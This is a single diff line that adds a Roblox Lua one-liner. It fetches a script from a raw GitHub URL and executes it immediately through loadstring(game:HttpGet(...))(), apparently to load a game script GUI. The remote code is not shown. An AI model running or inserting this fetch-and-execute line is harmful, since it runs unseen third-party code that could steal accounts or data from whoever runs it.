@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/language-gui/gui/script_gui_2025-08-22.lua", true))()
